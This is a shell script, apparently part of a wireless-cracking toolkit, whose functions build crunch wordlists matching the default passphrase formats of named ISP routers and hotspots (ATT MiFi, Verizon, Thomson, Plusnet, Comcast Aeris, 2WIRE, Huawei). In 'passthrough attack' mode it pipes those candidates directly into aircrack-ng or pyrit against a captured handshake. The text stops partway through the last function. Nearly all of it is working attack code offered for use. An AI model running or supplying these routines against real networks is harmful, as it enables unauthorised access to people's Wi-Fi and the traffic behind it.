#!/bin/sh
###attmifi###
function f_att () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_attGTK
	else
	echo "This script will create a word list for pre-set ATT MIFI wireless hotspot passwords."
        echo
	sleep 1
        echo "This worldlist will be around impossibly large, make sure you have HDD space!"
	echo "(I highly suggest you passthrough this feature...)"
	echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
	echo
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_att
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 13 13 -t %,,,,,,,,,%,, -d 2% -d 2, -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 13 13 -t %,,,,,,,,,%,, -d 2% -d 2, | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 13 13 -t %,,,,,,,,,%,, -d 2% -d 2, | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###attGTK###
function f_attGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set ATT MIFI wireless hotspot passwords.\nThis worldlist will be impossibly large, make sure you have HDD space!\n(I highly suggest you passthrough this feature...)\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
		if [ "$passthrough" = "0" ]; then
        	/usr/bin/crunch 13 13 -t %,,,,,,,,,%,, -d 2% -d 2, -o $filename.lst
		elif [ "$passthrough" = "1" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 13 13 -t %,,,,,,,,,%,, -d 2% -d 2, | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
		elif [ "$passthrough" = "2" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 13 13 -t %,,,,,,,,,%,, -d 2% -d 2, | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
		fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###vzw mifi###
function f_vzw () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_vzwGTK
	else
		echo "This script will create a word list for pre-set Verizon Wireless Mifi Device passwords."
       		echo
		sleep 1
        	echo "This worldlist will be around ~1.8gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        	echo
		sleep 1
		f_echobreak
		echo "What would you like the output file to be named?"
		echo "(The file will be saved with the .lst extension)"
		echo
		sleep 1
		read filename
		echo
		sleep 1
		echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
		echo 
		read destination
		while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_vzw
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
		echo
		echo
		echo
		echo
		echo
		echo
		list=$(ls *.lst)
		echo "Would you like to remove all current .lst word lists in the script directory?"
		echo "(lists to be removed: $list)"
		echo
		sleep 2
		echo "(Any .lst word lists in the current directory will be deleted due to this script.)"
		echo
		sleep 1
		echo "To delete the .lst lists enter d | To backup them to a temporary directory enter m."
		echo
		sleep 1
		echo "Or you can press enter to skip this step."
		echo
		sleep 1
		echo "(m/d)"
		sleep 2
		read backup
		if [ "$backup" = "d" ]; then
			list=$(ls *.lst)
			echo "Deleting existings lists in the script directory."
			echo "(lists to be removed: $list)"
			rm *.lst
			echo
			sleep 2
			echo "The script directory has been cleared of existing lists."
			echo
			sleep 1		
		elif [ "$backup" = "m" ]; then
			echo
			echo "Making directory: /backup/ in the script folder."
			mkdir backup
			sleep 1
			echo "Moving existing lists to /backup/."
			sleep 1
			mv *.lst backup
			sleep 1
		else
			echo
			echo "You did not enter an answer, skipping..."
			echo
			sleep 2
		fi
	sleep 1
	echo -en "\nHit return to create the list: "
        read return
        if [ "$return" == "" ]; then
        	echo "Please wait while the temp lists are being generated in the folder this script is located"
		sleep 1
        	bash vzwmifi.sh
		echo $ECHOCOLOR""
	fi
	echo
	echo "About to combine temp lists into $filename.lst"
	echo
	sleep 1
	cat *.lst > $filename.lst
	sleep 1
	echo
	echo "The temp lists have been successfully combined into $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to the directory you selected ($destination)."
		echo
		sleep 1
		mv $filename.lst "$destination"\
		echo
		sleep 1
		echo "$filename.lst has been moved $destination"
		echo
		sleep 1
		echo "Removing temp lists..."
		echo
		rm *.lst
		echo
		sleep 1
		echo "The temp lists have been successfully removed."
		echo
		sleep 1
	else
		echo
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###vzwGTK###
function f_vzwGTK () {
	zenity --no-wrap --info --text "This script will create a word list for pre-set Verizon Wireless Mifi Device passwords.\nThis worldlist will be around ~1.8gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	list=$(ls *.lst)
	zenity --no-wrap --question --title "Delete or Move Scripts" --text "Would you like to remove all current .lst lists in the script directory?\n(Any .lst word lists in the current directory will be deleted due to this script.)\nTo delete the .lst lists press Yes, otherwise they will be moved to   /backup/.\n(lists to be removed: $list)"
	if (( $? == 0 )); then
		list=$(ls *.lst)
		zenity --no-wrap --info --timeout=4 --text "Deleting existings .lst lists in the script directory.\n(lists to be removed: $list)"
		rm *.lst
		zenity --no-wrap --info --timeout=4 --text "The script directory has been cleared of existing .lst lists."	
	else
		zenity --no-wrap --info --timeout=4 --text "Making directory: /backup/ in the script folder"
		mkdir backup
		zenity --no-wrap --info --timeout=4 --text "Moving existing .lst word lists to /backup/."
		mv *.lst backup
	fi
	zenity --no-wrap --question --title "Create word list" --text "Would you like to create the word list: $filename.lst"
	if (( $? == 0 )); then
        	zenity --no-wrap --info --timeout=4 --text "Please wait while the temp lists are being generated in the folder this script is located"
        	bash vzwmifi.sh
		echo $ECHOCOLOR""
	else 
		f_menu
	fi
	zenity --no-wrap --info --timeout=4 --text "About to combine temp lists into $filename.lst"
	cat *.lst > $filename.lst
	zenity --no-wrap --info --timeout=4 --text "The temp lists have been successfully combined into $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to the directory you selected ($destination)."
		mv $filename.lst "$destination"
		zenity --no-wrap --info --timeout=4 --text "$filename.lst has been moved $destination"
		zenity --no-wrap --info --timeout=4 --text "Removing temp lists..."
		rm *.lst
		zenity --no-wrap --info --timeout=4 --text "The temp lists have been successfully removed."
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
}
###thomson###
function f_thomson () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_thomsonGTK
	else
	echo "This script will create a word list for pre-set Thomson (i.e. Thomson01A00) router passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~680gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ];then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
		while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_thomson
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	echo
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 10 10 -t ,%,,%,%%%% -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t ,%,,%,%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t ,%,,%,%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###thomson gtk###
function f_thomsonGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set Thomson (i.e. Thomson01A00) router passwords.\nThis worldlist will be around ~680gb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
		if [ "$passthrough" = "0" ]; then
        	/usr/bin/crunch 10 10 -t ,%,,%,%%%% -o $filename.lst
		elif [ "$passthrough" = "1" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t ,%,,%,%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
		elif [ "$passthrough" = "2" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t ,%,,%,%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
		fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###plusnet###
function f_plusnet () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_plusnetGTK
	else
	echo "This script will create a word list for pre-set Plusnet (i.e. PlusnetwirelessD10FEC) router passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~680gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_plusnet
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	echo
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 10 10 -t %%%,%,%%%% -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t %%%,%,%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t %%%,%,%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	if [ "$passthrough" = "0" ]; then
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	else
		echo
	fi
	fi
}
###plusnet###
function f_plusnetGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set Plusnet (i.e. PlusnetwirelessD10FEC) router passwords.\nThis worldlist will be around ~680gb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		if [ "$passthrough" = "0" ]; then
        	/usr/bin/crunch 10 10 -t %%%,%,%%%% -o $filename.lst
		elif [ "$passthrough" = "1" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t %%%,%,%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
		elif [ "$passthrough" = "2" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t %%%,%,%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###koobrick###
function f_koobrick () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_koobrickGTK
	else
	echo "This script will create a word list for pre-set KooBrick (i.e. KooBrick) router passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~38gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination	
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_koobrick
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done

	echo
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 8 8 -t @@,%%@%% -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack"	
	sleep 2
	/usr/bin/crunch 8 8 -t @@,%%@%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack"	
	sleep 2
	/usr/bin/crunch 8 8 -t @@,%%@%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###koobrickgtk###
function f_koobrickGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set KooBrick (i.e. KooBrick) router passwords.\nThis worldlist will be around ~38gb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
        		if [ "$passthrough" = "0" ]; then
        		/usr/bin/crunch 8 8 -t @@,%%@%% -o $filename.lst
			elif [ "$passthrough" = "1" ]; then
			zenity --info --timeout=4 "About to passthrough attack."
			/usr/bin/crunch 8 8 -t @@,%%@%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
			elif [ "$passthrough" = "2" ]; then
			zenity --info --timeout=4 "About to passthrough attack."
			/usr/bin/crunch 8 8 -t @@,%%@%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
			fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###AREIS###
function f_aeris () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_aerisGTK
	else
	echo "This script will create a word list for pre-set Comcast Aeris (i.e. Home-1234) router passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~11tb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_aeris
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	echo
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 10 10 -t %,%,%,%,%, -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t %,%,%,%,%, | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t %,%,%,%,%, | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###aerisGTK###
function f_aerisGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set Comcast Aeris (i.e. Home-1234) router passwords.\nThis worldlist will be around ~11tb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
		if [ "$passthrough" = "0" ]; then
        	/usr/bin/crunch 10 10 -t %,%,%,%,%, -o $filename.lst
		elif [ "$passthrough" = "1" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t %,%,%,%,%, | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
		elif [ "$passthrough" = "2" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t %,%,%,%,%, | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
		fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###2WIRE###
function f_2wire () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_2wireGTK
	else
	echo "This script will create a word list for pre-set ATT 2WIRE (i.e. 2WIRE123) router passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~102gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
	echo
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_2wire
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 10 10 -t %%%%%%%%%% -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t %%%%%%%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 10 10 -t %%%%%%%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###2wireGTK###
function f_huaweiGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set Huawei Mifi (i.e. E123X-1a23) device passwords.\nThis worldlist will be around ~858mb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
		if [ "$passthrough" = "0" ]; then
        	/usr/bin/crunch 8 8 -t %%%%%%%% -o $filename.lst
		elif [ "$passthrough" = "1" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 8 8 -t %%%%%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
		elif [ "$passthrough" = "2" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 8 8 -t %%%%%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
		fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###huawei mifi###
function f_huawei () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_huaweiGTK
	else
	echo "This script will create a word list for pre-set Huawei Mifi (i.e. E123X-1a23) device passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~858mb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_huawei
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	echo
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 8 8 -t %%%%%%%% -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 8 8 -t %%%%%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 8 8 -t %%%%%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###2wireGTK###
function f_2wireGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set ATT 2WIRE (i.e. 2WIRE123) router passwords.\nThis worldlist will be around ~102gb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
		if [ "$passthrough" = "0" ]; then
        	/usr/bin/crunch 10 10 -t %%%%%%%%%% -o $filename.lst
